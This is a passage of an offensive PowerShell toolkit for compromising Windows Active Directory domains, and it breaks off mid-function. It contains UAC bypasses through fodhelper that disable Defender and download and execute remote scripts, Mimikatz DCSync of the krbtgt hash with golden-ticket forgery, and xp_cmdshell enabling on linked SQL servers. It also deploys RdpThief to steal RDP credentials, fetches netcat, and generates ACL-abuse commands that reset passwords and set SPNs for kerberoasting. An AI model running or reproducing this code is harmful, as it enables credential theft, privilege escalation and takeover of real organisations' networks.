    $pview_constrained_delegation_output = "enum-powerview-" + $timestamp + "-delegation-constrained.txt"
    Get-NetComputer -TrustedToAuth | select samaccountname | Out-File $p\$pview_constrained_delegation_output
    Get-NetComputer -TrustedToAuth | Out-File $p\$pview_constrained_delegation_output -append 
    $pview_unconstrained_delegation_output = "enum-powerview-" + $timestamp + "-delegation-unconstrained.txt"
    Get-NetComputer -Unconstrained | select samaccountname | Out-File $p\$pview_unconstrained_delegation_output 
    Get-NetComputer -Unconstrained | Out-File $p\$pview_unconstrained_delegation_output -append
    #shares
    Write-Host "Gathering Shares"
    $pview_domainshare_output = "enum-powerview-" + $timestamp + "-shares.txt"
    Find-DomainShare -CheckShareAccess -erroraction SilentlyContinue | Out-File $p\$pview_domainshare_output 
    #ous
    Write-Host "Gathering OUs"
    $pview_domainou_output = "enum-powerview-" + $timestamp + "-OUs.txt"
    Get-DomainOU | Out-File $p\$pview_domainou_output
    #trusts
    Write-Host "Gathering Trusts"
    $pview_trusts_output = "enum-powerview-" + $timestamp + "-trusts.txt"
    Get-NetDomainTrust | Out-File $p\$pview_trusts_output 
    Write-Output "All Trusts in the Forest" | Out-File -Append $p\$pview_trusts_output 
    Get-NetForestDomain | Get-NetDomainTrust | Out-File -Append $p\$pview_trusts_output
    #findlocaladminaccess
    Write-Host "Finding Local Admin Access"
    $pview_local_admin_output = "enum-powerview-" + $timestamp + "-local-admin-access.txt"
    Find-LocalAdminAccess -erroraction SilentlyContinue | Out-File $p\$pview_local_admin_output
    #Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
    Write-Host "Invoking User Hunter"
    $pview_user_hunter_output = "enum-powerview-" + $timestamp + "-user-hunter.txt"
    Invoke-UserHunter -CheckAccess -erroraction SilentlyContinue | Out-File $p\$pview_user_hunter_output
}

Function enum_uac_fodhelper {
  New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe" -Force
  New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name "DelegateExecute" -PropertyType String -Force
  Start-Process "C:\Windows\System32\fodhelper.exe" -wait
}

Function enum_uac_fodrunner {
  $fodrunnerfile = Read-Host "What's the name of your runner file? (ex. run.txt)"
  New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -exec bypass -nop -windowstyle hidden -noexit Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend; (New-Object System.Net.WebClient).DownloadString('$uri/$fodrunnerfile') | IEX" -Force
  New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name "DelegateExecute" -PropertyType String -Force
  Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
}




function golden_ticket {
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"

    IEX (New-Object Net.WebClient).DownloadString($uri + '/powerview.ps1')

    iwr -o "$p/cats.exe" "$uri/cats.exe"
    iwr -o "$p/cats.sys" "$uri/cats.sys"

    $domain = (Get-Domain).Name
    $targetdomain = ((Get-Domain).Parent).Name
    $domain_sid = (Get-ADDomain).DomainSID.Value
    $domain_sids = (Get-ADDomain -Identity $targetdomain).DomainSID.Value + "-519"

    $mimikatzCommand = 'cmd /c "' + $p + '/cats.exe" "privilege::debug" "!+" "token::elevate" "lsadump::dcsync /user:krbtgt@' + $domain + '" "exit" > "' + $p + '/mimikatz_output.txt"'
    Invoke-Expression $mimikatzCommand
    $output = Get-Content "$p/mimikatz_output.txt"

    $krbtgthash = ""

    foreach ($line in $output) {
        if ($line -match "Hash NTLM:\s+([a-fA-F0-9]{32})") {
            $krbtgthash = $matches[1]
            break
        }
    }

    if ($krbtgthash) {
        Set-Content -Path "$p/krbtgthash.txt" -Value "$krbtgthash"
    } else {
        Write-Output "Failed to find NTLM hash in Mimikatz output."
        return
    }

    Write-Output "Domain: $domain"
    Write-Output "Target Domain: $targetdomain"
    Write-Output "Domain SID: $domain_sid"
    Write-Output "Domain SIDS: $domain_sids"
    Write-Output "Krbtgt Hash: $krbtgthash"

    $mimikatzGoldenTicketCommand = 'kerberos::golden /user:administrator /domain:' + $domain + ' /sid:' + $domain_sid + ' /krbtgt:' + $krbtgthash + ' /sids:' + $domain_sids + ' /ptt'
    Write-Output "Golden Ticket Command: $mimikatzGoldenTicketCommand"
    $catsgoldenticketexecute = 'cmd /c "' + $p + '/cats.exe" + $mimikatzGoldenTicketCommand + "misc::cmd"'
    Invoke-Expression $catsgoldenticketexecute
    Write-Output "Golden Ticket Command: $mimikatzGoldenTicketCommand"
    
}

function golden_ticket_trust_key {
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"

    # Import PowerView script
    IEX (New-Object Net.WebClient).DownloadString($uri + '/powerview.ps1')

    iwr -o "$p/cats.exe" "$uri/cats.exe"
    iwr -o "$p/cats.sys" "$uri/cats.sys"

    # Get Domain Information using PowerView
    try {
        $domain = (Get-NetDomain).Name
        $targetdomain = (Get-NetForest).Domains[0] # Assuming the first domain in the forest is the target domain
        $domain_sid = (Get-NetDomain).DomainSID
        $domain_sids = $domain_sid + "-519"
    } catch {
        Write-Output "Error retrieving domain information: $_"
        return
    }

    # Obtain the trust key
    $mimikatzTrustKeyCommand = 'cmd /c "' + $p + '/cats.exe" "privilege::debug" "!+" "token::elevate" "lsadump::dcsync /user:krbtgt@' + $targetdomain + '" "exit" > "' + $p + '/mimikatz_trustkey_output.txt"'
    Invoke-Expression $mimikatzTrustKeyCommand
    $output = Get-Content "$p/mimikatz_trustkey_output.txt"

    $trustkey = ""

    foreach ($line in $output) {
        if ($line -match "Trust Key:\s+([a-fA-F0-9]{32})") {
            $trustkey = $matches[1]
            break
        }
    }

    if ($trustkey) {
        Set-Content -Path "$p/trustkey.txt" -Value "$trustkey"
    } else {
        Write-Output "Failed to find Trust Key in Mimikatz output."
        return
    }

    Write-Output "Domain: $domain"
    Write-Output "Target Domain: $targetdomain"
    Write-Output "Domain SID: $domain_sid"
    Write-Output "Domain SIDS: $domain_sids"
    Write-Output "Trust Key: $trustkey"

    $mimikatzGoldenTicketCommand = 'kerberos::golden /user:administrator /domain:' + $targetdomain + ' /sid:' + $domain_sid + ' /krbtgt:' + $trustkey + ' /sids:' + $domain_sids + ' /ptt'
    Write-Output "Golden Ticket Command: $mimikatzGoldenTicketCommand"
    $catsgoldenticketexecute = 'cmd /c "' + $p + '/cats.exe" ' + $mimikatzGoldenTicketCommand + ' "misc::cmd"'
    Invoke-Expression $catsgoldenticketexecute
    Write-Output "Golden Ticket Command Executed"
}


function enum_adpeas_specific_domain {
    param (
        [string]$zdomain
    )
    Write-Host "## Running ADPeas for specific domain"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumadpeasoutput = "enum-adpeas-" + $timestamp + ".txt"
    IEX (New-Object Net.WebClient).DownloadString($uri + '/powerview.ps1')
    $zdomaincontroller = ((get-domain).DomainControllers).Name
    IEX (New-Object Net.WebClient).DownloadString($uri + '/adPEAS.ps1')
    echo "adpeas:" | Out-File $p\$enumadpeasoutput
    echo $timestamp | Out-File -Append $p\$enumadpeasoutput
    Invoke-adPEAS -Domain $zdomain -Server $zdomaincontroller | Out-File -Append $p\$enumadpeasoutput -Force
}


function enum_specific_domain {
    param (
        [string]$zdomain
    )
    
    Write-Output "Enumerating domain: $zdomain"
    
    IEX (New-Object Net.WebClient).DownloadString($uri + '/powerview.ps1')
    IEX (New-Object Net.WebClient).DownloadString($uri + '/LAPSToolkit.ps1')
    
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"

    # Define the output files with the domain name included
    $pview_domain_output = "enum-powerview-$zdomain-$timestamp-domain.txt"
    $pview_domaincontroller_output = "enum-powerview-$zdomain-$timestamp-domain-controllers.txt"
    $pview_domainpolicy_output = "enum-powerview-$zdomain-$timestamp-domain-policy.txt"
    $pview_userlist_output = "enum-powerview-$zdomain-$timestamp-user-list-enabled.txt"
    $pview_basic_user_output = "enum-powerview-$zdomain-$timestamp-user-info-basic.txt"
    $pview_basic_userdesc_output = "enum-powerview-$zdomain-$timestamp-user-info-descriptions.txt"
    $pview_advanced_user_output = "enum-powerview-$zdomain-$timestamp-user-info-extended.txt"
    $pview_asrep_output = "enum-powerview-$zdomain-$timestamp-asrep.txt"
    $pview_kerberoastable_output = "enum-powerview-$zdomain-$timestamp-kerberoastable.txt"
    $pview_nopasswd_output = "enum-powerview-$zdomain-$timestamp-user-nopasswd.txt"
    $pview_basic_group_output = "enum-powerview-$zdomain-$timestamp-groups.txt"
    $pview_rdp_group_output = "enum-powerview-$zdomain-$timestamp-groups-rdpusers.txt"
    $pview_da_group_output = "enum-powerview-$zdomain-$timestamp-groups-domainadmins.txt"
    $pview_computerlist_output = "enum-powerview-$zdomain-$timestamp-computers-list.txt"
    $pview_basic_computer_output = "enum-powerview-$zdomain-$timestamp-computers-extended.txt"
    $pview_constrained_delegation_output = "enum-powerview-$zdomain-$timestamp-delegation-constrained.txt"
    $pview_unconstrained_delegation_output = "enum-powerview-$zdomain-$timestamp-delegation-unconstrained.txt"
    $pview_domainshare_output = "enum-powerview-$zdomain-$timestamp-shares.txt"
    $pview_domainou_output = "enum-powerview-$zdomain-$timestamp-OUs.txt"
    $pview_trusts_output = "enum-powerview-$zdomain-$timestamp-trusts.txt"
    $enumLAPS = "enum-laps-$zdomain-$timestamp-trusts.txt"
    $enumLAPSdelegatedgroups = "enum-laps-Groups-$zdomain-$timestamp-trusts.txt"

    # Perform tasks
    Write-Host "Gathering Domain info"
    Get-NetDomain -Domain $zdomain | Out-File $p\$pview_domain_output
    
    Write-Host "Gathering DC Info"
    Get-NetDomainController -Domain $zdomain | Out-File $p\$pview_domaincontroller_output  
    
    Write-Host "Gathering Domain Policy Info"
    Get-DomainPolicy -Domain $zdomain | Out-File $p\$pview_domainpolicy_output  
    
    Write-Host "Gathering User Info"
    Get-NetUser -Domain $zdomain -UACFilter NOT_ACCOUNTDISABLE -ErrorAction SilentlyContinue | select-object -expandproperty samaccountname | Out-File $p\$pview_userlist_output
    Get-NetUser -Domain $zdomain -UACFilter NOT_ACCOUNTDISABLE -ErrorAction SilentlyContinue | select samaccountname, description, pwdlastset, logoncount, badpwdcount | Out-File $p\$pview_basic_user_output
    Get-DomainUser -Domain $zdomain -Properties samaccountname,description -ErrorAction SilentlyContinue | Where {$_.description -ne $null} | Out-File $p\$pview_basic_userdesc_output
    Get-NetUser -Domain $zdomain -ErrorAction SilentlyContinue | Out-File $p\$pview_advanced_user_output
    Get-NetUser -Domain $zdomain -PreauthNotRequired -ErrorAction SilentlyContinue | Out-File $p\$pview_asrep_output
    Get-NetUser -Domain $zdomain -SPN -ErrorAction SilentlyContinue | Out-File $p\$pview_kerberoastable_output
    #Get-DomainUser -Domain $zdomain -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol | Out-File $p\$pview_nopasswd_output
    
    Write-Host "Gathering Group Info"
    Get-NetGroup -Domain $zdomain | select samaccountname, admincount, description | Out-File $p\$pview_basic_group_output
    (Get-NetGroup -Domain $zdomain 'remote desktop users').Member  | Out-File $p\$pview_rdp_group_output
    (Get-NetGroup -Domain $zdomain 'domain admins').Member  | Out-File $p\$pview_da_group_output
    #Get-DomainGroupMember -Domain $zdomain "Domain Admins" -recurse | select-object -ExpandProperty membername | Out-File $p\$pview_da_group_output
    #Get-DomainGroupMember -Domain $zdomain "Domain Admins" -recurse | Out-File -Append $p\$pview_da_group_output
    
    Write-Host "Gathering Computer Info"
    Get-NetComputer -Domain $zdomain | select-object -expandproperty dnshostname -erroraction silentlycontinue | Out-File $p\$pview_computerlist_output  
    Get-NetComputer -Domain $zdomain | Out-File $p\$pview_basic_computer_output  
    Get-NetComputer -Domain $zdomain -TrustedToAuth | select samaccountname | Out-File $p\$pview_constrained_delegation_output
    Get-NetComputer -Domain $zdomain -TrustedToAuth | Out-File $p\$pview_constrained_delegation_output -append 
    Get-NetComputer -Domain $zdomain -Unconstrained | select samaccountname | Out-File $p\$pview_unconstrained_delegation_output 
    Get-NetComputer -Domain $zdomain -Unconstrained | Out-File $p\$pview_unconstrained_delegation_output -append
    
    #Write-Host "Gathering Shares"
    #Find-DomainShare -Domain $zdomain -CheckShareAccess -erroraction SilentlyContinue | Out-File $p\$pview_domainshare_output 
    
    Write-Host "Gathering OUs"
    Get-DomainOU -Domain $zdomain | Out-File $p\$pview_domainou_output
    
    Write-Host "Gathering Trusts"
    Get-NetDomainTrust -Domain $zdomain | Out-File $p\$pview_trusts_output 
    Write-Output "All Trusts in the Forest" | Out-File -Append $p\$pview_trusts_output 
    Get-NetForestDomain | Get-NetDomainTrust | Out-File -Append $p\$pview_trusts_output

    Write-Host "Getting LAPS"
    Get-LAPSComputers -ErrorAction SilentlyContinue | Out-File $p\$enumLAPS
    Find-LAPSDelegatedGroups -ErrorAction SilentlyContinue | Out-File $p\$enumLAPSdelegatedgroups

    bloodhound -domain $zdomain
    bloodhound-ce -domain $zdomain
    enum_adpeas_specific_domain $zdomain   
    zip_files -path $p
    # Pull netcat
    iwr -o "$p/nc.exe" "$uri/nc64.exe"
}


function enumerate_sql {
    param (
        [string]$outputDir = $p,
        [string]$username,
        [string]$password
    )

    # Download and execute PowerUpSQL.ps1
    IEX (New-Object Net.WebClient).DownloadString($uri + '/PowerUpSQL.ps1')

    Write-Host "## Enumerating SQL Servers"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumsqlserversoutput = "enum-sqlservers-" + $timestamp + ".txt"
    $outputFilePath = Join-Path -Path $outputDir -ChildPath $enumsqlserversoutput

    # Set up parameters for PowerUpSQL commands
    $authParams = @{}
    if ($username -and $password) {
        $authParams['-Username'] = $username
        $authParams['-Password'] = $password
    }

    # Perform SQL audit and process results
    $sqlAuditResults = Invoke-SQLAudit @authParams -Verbose
    Foreach($audit in $sqlAuditResults) {
        $auditText = $audit | Out-String
        $auditLines = $auditText -split "`n"
        Foreach ($line in $auditLines) {
            if ($line -match "Vulnerability") {
                Write-Host $line -ForegroundColor Cyan
            } else {
                Write-Host $line
            }
            $line | Out-File -Append $outputFilePath
        }
    }

    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.filter="serviceprincipalname=*sql*"
    $Result = $Searcher.FindAll()

    # Print and save enumeration results
    Foreach($obj in $Result) {
        Foreach($propName in $obj.Properties.PropertyNames) {
            $propValues = $obj.Properties[$propName]
            Foreach($value in $propValues) {
                $propText = "$propName : $value"
                if ($propName -match "Vulnerability") {
                    Write-Host $propText -ForegroundColor Cyan
                } else {
                    Write-Host $propText
                }
                $propText | Out-File -Append $outputFilePath
            }
        }
        Write-Output "--------------------------" | Out-File -Append $outputFilePath
    }

    Write-Host "Enumeration completed. Results saved to $outputFilePath"

    # Get SQL instance information
    $sqlInstanceInfo = Get-SQLServerInfo @authParams

    if ($sqlInstanceInfo) {
        foreach ($info in $sqlInstanceInfo) {
            # Highlight specific properties during output
            $info.PSObject.Properties | ForEach-Object {
                $propertyName = $_.Name
                $propertyValue = $_.Value

                if ($propertyName -eq "Instance" -or $propertyName -eq "CurrentLogin" -or $propertyName -eq "ComputerName" -or $propertyName -eq "ServiceAccount") {
                    Write-Host "$propertyName : $propertyValue" -ForegroundColor Cyan
                } else {
                    Write-Host "$propertyName : $propertyValue"
                }
            }

            # Perform query on the identified SQL instance
            $instanceName = $info.Instance
            Write-Host "Checking for linked servers on $($instanceName -replace '\\', '\')" -ForegroundColor Blue
            $queryResults = Get-SQLQuery -Instance $instanceName -Query "EXEC sp_linkedservers;" @authParams -Verbose

            if ($queryResults) {
                foreach ($result in $queryResults) {
                    $srvName = $result.SRV_NAME
                    Write-Host "Running Get-SQLServerInfo for $srvName" -ForegroundColor Blue
                    $serverInfo = Get-SQLServerInfo -Instance $srvName @authParams

                    # Highlight specific properties from Get-SQLServerInfo output
                    $serverInfo.PSObject.Properties | ForEach-Object {
                        $propertyName = $_.Name
                        $propertyValue = $_.Value

                        if ($propertyName -eq "ComputerName" -or $propertyName -eq "Instance" -or `
                            $propertyName -eq "ServiceAccount" -or $propertyName -eq "CurrentLogin") {
                            Write-Host "$propertyName : $propertyValue" -ForegroundColor Cyan
                        } else {
                            Write-Host "$propertyName : $propertyValue"
                        }
                    }

                    # Execute the specified query with the instance name and linked server
                    $loginName = if ($username) { $username } else { 'sa' }
                    $query = "EXECUTE as LOGIN = '$loginName';EXEC sp_serveroption '${srvName}', 'rpc out', 'true';EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT ${srvName};EXEC('xp_cmdshell ''whoami'';') AT ${srvName};"
                    Write-Host "Executing the following query on ${instanceName} with linked server ${srvName}:" -ForegroundColor Blue
                    if ($username -and $password) {
                        Write-Host "Get-SQLQuery -Instance ${instanceName} -Query `"$query`" -Username $username -Password $password -Verbose"
                        Get-SQLQuery -Instance $instanceName -Query $query -Username $username -Password $password -Verbose
                    } else {
                        Write-Host "Get-SQLQuery -Instance ${instanceName} -Query `"$query`" -Verbose"
                        Get-SQLQuery -Instance $instanceName -Query $query -Verbose
                    }
                }
            } else {
                Write-Warning "$instanceName : Connection Failed."
            }
        }
    } else {
        Write-Warning "No SQL instance information found."
    }

    # Print the IEX command to the screen
    Write-Host "IEX (New-Object Net.WebClient).DownloadString('$uri/PowerUpSQL.ps1')" -ForegroundColor DarkYellow
}


function rdp_thief {
    $DestinationPath = "C:\windows\tasks"
    $files = @("rdp-thief.exe", "RdpThief.dll")

    foreach ($file in $files) {
        $url = "$uri/$file"
        $destination = Join-Path -Path $DestinationPath -ChildPath $file
        Invoke-WebRequest -Uri $url -OutFile $destination
    }

    # Spawn a new PowerShell window and launch rdp-thief.exe
    $exePath = Join-Path -Path $DestinationPath -ChildPath "rdp-thief.exe"
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -Command `& {Start-Process -FilePath '$exePath'}"

    # Get the username of the logged-in user
    $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]

    # Define the path to list directories
    $tempPath = "C:\Users\$username\AppData\Local\Temp"

    # List all directories in the Temp folder
    $directories = Get-ChildItem -Path $tempPath -Directory

    if ($directories) {
        Write-Output "Directories in ${tempPath}:"
        foreach ($dir in $directories) {
            Write-Output $dir.FullName
        }
    } else {
        Write-Output "No directories found in ${tempPath}."
    }

    # Check for the presence of data.bin file every 10 seconds
    $dataBinFound = $false
    while (-not $dataBinFound) {
        $directories = Get-ChildItem -Path $tempPath -Directory
        foreach ($dir in $directories) {
            $dataBinPath = Join-Path -Path $dir.FullName -ChildPath "data.bin"
            if (Test-Path -Path $dataBinPath) {
                Write-Output "A file has been created at $dataBinPath"
                type $dataBinPath
                $dataBinFound = $true
                break
            }
        }
        if (-not $dataBinFound) {
            Start-Sleep -Seconds 10
        }
    }
}

function enum_directory_structure {
    Write-Host "## Enumerating C: drive"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%M-%S"
    $outputFile = "$p\enum-directory-enumeration-manual-$timestamp.txt"

    try {
        # Enumerate and format the C: drive directory structure
        Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {
            $_.FullName -notlike "C:\Windows*" -and
            $_.FullName -notlike "C:\Program Files*" -and
            $_.FullName -notlike "C:\Program Files (x86)*" -and
            $_.FullName -notlike "C:\ProgramData*" -and
            $_.FullName -notlike "C:\Users\All Users*" -and
            $_.FullName -notlike "*\AppData*"
        } | ForEach-Object {
            if ($_.PSIsContainer) {
                Write-Output " Directory of $($_.FullName)"
                Write-Output ""
                Write-Output (Get-ChildItem -Path $_.FullName -Force | Format-Table -Property Name, Length, LastWriteTime -AutoSize | Out-String)
            } else {
                Write-Output "$($_.FullName)"
            }
        } | Out-File -FilePath $outputFile -Encoding utf8

        # List contents of the excluded directories non-recursively
        Get-ChildItem -Path "C:\Program Files" -Force -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.PSIsContainer) {
                Write-Output " Directory of $($_.FullName)"
                Write-Output ""
                Write-Output (Get-ChildItem -Path $_.FullName -Force | Format-Table -Property Name, Length, LastWriteTime -AutoSize | Out-String)
            } else {
                Write-Output "$($_.FullName)"
            }
        } | Out-File -FilePath $outputFile -Append -Encoding utf8

        Get-ChildItem -Path "C:\Program Files (x86)" -Force -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.PSIsContainer) {
                Write-Output " Directory of $($_.FullName)"
                Write-Output ""
                Write-Output (Get-ChildItem -Path $_.FullName -Force | Format-Table -Property Name, Length, LastWriteTime -AutoSize | Out-String)
            } else {
                Write-Output "$($_.FullName)"
            }
        } | Out-File -FilePath $outputFile -Append -Encoding utf8

        Get-ChildItem -Path "C:\ProgramData" -Force -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.PSIsContainer) {
                Write-Output " Directory of $($_.FullName)"
                Write-Output ""
                Write-Output (Get-ChildItem -Path $_.FullName -Force | Format-Table -Property Name, Length, LastWriteTime -AutoSize | Out-String)
            } else {
                Write-Output "$($_.FullName)"
            }
        } | Out-File -FilePath $outputFile -Append -Encoding utf8

        Get-ChildItem -Path "C:\Users\All Users" -Force -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.PSIsContainer) {
                Write-Output " Directory of $($_.FullName)"
                Write-Output ""
                Write-Output (Get-ChildItem -Path $_.FullName -Force | Format-Table -Property Name, Length, LastWriteTime -AutoSize | Out-String)
            } else {
                Write-Output "$($_.FullName)"
            }
        } | Out-File -FilePath $outputFile -Append -Encoding utf8

        Write-Host "Enumeration completed successfully. Output saved to $outputFile"
    } catch {
        Write-Host "An error occurred during enumeration: $_"
    }
}


function enum_dangerous_rights {
    param (
        [Parameter(Mandatory=$true)]
        [string]$userAccount
    )

    # Replace backslashes with hyphens for filename safety
    $safeUserAccount = $userAccount -replace '\\', '-'

    # Define the timestamp and output file names
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%M-%S"
    $outputFile = "enum-PowerView-Dangerous-Rights-UserACE-" + $safeUserAccount + "-" + $timestamp + ".txt"
    $genericAllFile = "enum-PowerView-Dangerous-Rights-UserACE-GenericAll-" + $safeUserAccount + "-" + $timestamp + ".txt"
    $writeDaclFile = "enum-PowerView-Dangerous-Rights-UserACE-WriteDacl-" + $safeUserAccount + "-" + $timestamp + ".txt"
    $genericWriteFile = "enum-PowerView-Dangerous-Rights-UserACE-GenericWrite-" + $safeUserAccount + "-" + $timestamp + ".txt"
    $groupGenericAllFile = "enum-PowerView-Dangerous-Rights-GroupACE-GenericAll-" + $safeUserAccount + "-" + $timestamp + ".txt"
    $groupWriteDaclFile = "enum-PowerView-Dangerous-Rights-GroupACE-WriteDacl-" + $safeUserAccount + "-" + $timestamp + ".txt"
    $groupGenericWriteFile = "enum-PowerView-Dangerous-Rights-GroupACE-GenericWrite-" + $safeUserAccount + "-" + $timestamp + ".txt"

    # Ensure the directory exists
    if (-not (Test-Path $p)) {
        New-Item -Path $p -ItemType Directory -Force
    }

    # Import PowerView script
    IEX (New-Object Net.WebClient).DownloadString($uri + '/powerview.ps1')

    # Retrieve and process user ACLs
    $userAces = Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | 
        ForEach-Object {
            $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force
            $_
        }
    
    $filteredUserAces = $userAces | Where-Object { $_.Identity -eq $userAccount }

    # Output the filtered user ACEs to a file and display on screen
    $filteredUserAces | Tee-Object -FilePath "$p\$outputFile"

    # Initialize arrays to store commands for later output
    $genericAllCommands = @()
    $writeDaclCommands = @()
    $genericWriteCommands = @()
    $addDomainAclCommands = @()
    $genericWriteSPNCommands = @()  # New array for SPN commands

    foreach ($ace in $filteredUserAces) {
        $aceString = $ace | Out-String

        # Match for GenericAll
        if ($ace.ActiveDirectoryRights -match "GenericAll") {
            $aceString | Add-Content -Path "$p\$genericAllFile"
            
            # Extract and format ObjectDN
            $objectCN = ($ace.ObjectDN -split ',')[0] -replace 'CN=', ''
            $genericAllCommands += "net user $objectCN 'Password1!' /domain"
        }

        # Match for WriteDacl
        if ($ace.ActiveDirectoryRights -match "WriteDacl") {
            $aceString | Add-Content -Path "$p\$writeDaclFile"
            
            # Extract and format ObjectDN
            $objectCN = ($ace.ObjectDN -split ',')[0] -replace 'CN=', ''
            $writeDaclCommands += "net user $objectCN 'Password1!' /domain"
            
            # Prepare and add the Add-DomainObjectAcl command
            $addDomainAclCommand = "Add-DomainObjectAcl -TargetIdentity $objectCN -PrincipalIdentity $userAccount -Rights All"
            $addDomainAclCommands += $addDomainAclCommand
        }

        # Match for GenericWrite
        if ($ace.ActiveDirectoryRights -match "GenericWrite") {
            $aceString | Add-Content -Path "$p\$genericWriteFile"
            
            # Extract and format ObjectDN
            $objectCN = ($ace.ObjectDN -split ',')[0] -replace 'CN=', ''
            $genericWriteCommands += "Set-ADObject -SamAccountName $objectCN -PropertyName scriptpath -PropertyValue '\\$websrv\run.ps1'"
            
            # Prepare and add the SPN set command
            $spnSetCommand = "Set-DomainObject -Identity $objectCN -SET @{serviceprincipalname='foobar/$objectCN'}"
            $genericWriteSPNCommands += $spnSetCommand
            
            $kerberoastCommand = "# then kerberoast once the spn is set"
        }
    }

    # Display the ACEs on screen with color formatting for "GenericAll", "WriteDacl", and "GenericWrite"
    foreach ($ace in $filteredUserAces) {
        $aceString = $ace | Out-String
        if ($aceString -match "GenericAll") {
            Write-Host $aceString -ForegroundColor Yellow
        } elseif ($aceString -match "WriteDacl") {
            Write-Host $aceString -ForegroundColor Cyan
        } elseif ($aceString -match "GenericWrite") {
            Write-Host $aceString -ForegroundColor Green
        } else {
            Write-Host $aceString
        }
    }

    # Display formatted commands for GenericAll at the end
    foreach ($command in $genericAllCommands) {
        Write-Host "GenericAll: $command" -ForegroundColor Yellow
    }

    # Display formatted commands for WriteDacl with Add-DomainObjectAcl command before the net user commands
    foreach ($command in $addDomainAclCommands) {
        Write-Host "WriteDacl: $command" -ForegroundColor Cyan
    }

    foreach ($command in $writeDaclCommands) {
        Write-Host "WriteDacl: $command" -ForegroundColor Cyan
    }

    # Display formatted commands for GenericWrite
    foreach ($command in $genericWriteCommands) {
        Write-Host "GenericWrite: $command" -ForegroundColor Green
    }

    # Display SPN set command for GenericWrite
    foreach ($command in $genericWriteSPNCommands) {
        Write-Host "GenericWrite: $command" -ForegroundColor Green
    }

    Write-Host $kerberoastCommand -ForegroundColor Gray

    # New section for groups
    $groupAces = Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | 
        ForEach-Object {
            $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force
            $_
        }

    $filteredGroupAces = $groupAces | Where-Object { $_.Identity -eq $userAccount }

    # Initialize arrays for group commands
    $groupGenericAllCommands = @()
    $groupWriteDaclCommands = @()
    $groupGenericWriteCommands = @()
    $groupAddDomainAclCommands = @()

    foreach ($ace in $filteredGroupAces) {
        $aceString = $ace | Out-String

        # Match for GenericAll
        if ($ace.ActiveDirectoryRights -match "GenericAll") {
            $aceString | Add-Content -Path "$p\$groupGenericAllFile"
            
            # Extract and format ObjectDN
            $objectCN = ($ace.ObjectDN -split ',')[0] -replace 'CN=', ''
            # Remove domain prefix from user account for group commands
            $userWithoutDomain = ($userAccount -split '\\')[1]
            $groupGenericAllCommands += "net group $objectCN $userWithoutDomain /add /domain"
        }

        # Match for WriteDacl
        if ($ace.ActiveDirectoryRights -match "WriteDacl") {
            $aceString | Add-Content -Path "$p\$groupWriteDaclFile"
            
            # Extract and format ObjectDN
            $objectCN = ($ace.ObjectDN -split ',')[0] -replace 'CN=', ''
            # Remove domain prefix from user account for group commands
            $userWithoutDomain = ($userAccount -split '\\')[1]
            $groupWriteDaclCommands += "net group $objectCN $userWithoutDomain /domain"
            
            # Prepare and add the Add-DomainObjectAcl command
            $groupAddDomainAclCommand = "Add-DomainObjectAcl -TargetIdentity $objectCN -PrincipalIdentity $userAccount -Rights All"
            $groupAddDomainAclCommands += $groupAddDomainAclCommand
        }

        # Match for GenericWrite
        if ($ace.ActiveDirectoryRights -match "GenericWrite") {
            $aceString | Add-Content -Path "$p\$groupGenericWriteFile"
            
            # Extract and format ObjectDN
            $objectCN = ($ace.ObjectDN -split ',')[0] -replace 'CN=', ''
            # Remove domain prefix from user account for group commands
            $userWithoutDomain = ($userAccount -split '\\')[1]
            $groupGenericWriteCommands += "net group $objectCN $userWithoutDomain /add /domain"
        }
    }

    # Display the ACEs on screen with color formatting for "GenericAll", "WriteDacl", and "GenericWrite"
    foreach ($ace in $filteredGroupAces) {
        $aceString = $ace | Out-String
        if ($aceString -match "GenericAll") {
            Write-Host $aceString -ForegroundColor Yellow
        } elseif ($aceString -match "WriteDacl") {
            Write-Host $aceString -ForegroundColor Cyan
        } elseif ($aceString -match "GenericWrite") {
            Write-Host $aceString -ForegroundColor Green
        } else {
